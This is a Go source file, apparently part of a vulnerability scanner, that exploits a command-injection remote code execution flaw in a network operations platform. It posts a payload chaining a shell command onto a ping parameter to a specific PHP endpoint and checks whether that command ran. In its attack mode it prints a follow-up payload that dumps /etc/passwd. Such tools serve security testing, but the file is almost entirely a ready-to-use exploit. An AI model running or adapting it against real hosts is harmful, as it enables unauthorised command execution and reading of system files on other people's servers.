package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func QuanXiAI_RCE(url string, Attack bool) error {
	payload1 := `ping_cmd=8.8.8.8|echo ycx > 1.txt`
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/nmss/cloud/Ajax/ajax_cloud_router_config.php", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload1))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload1).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	url2 := fmt.Sprintf("%s/nmss/cloud/Ajax/1.txt", url)
	request2, err := http.NewRequest("GET", url2, nil)
	if err != nil {
		return err
	}

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body2), "ycx") {
		fmt.Println("[*]全息AI网络运维平台 RCE : " + url)
		if Attack {
			fmt.Println("Attack-Result : " + "请使用POST方法请求/nmss/cloud/Ajax/ajax_cloud_router_config.php，并传入请求体`ping_cmd=8.8.8.8|cat /etc/passwd>2.txt`\n")
		}
	}

	defer response.Body.Close()

	return nil
}
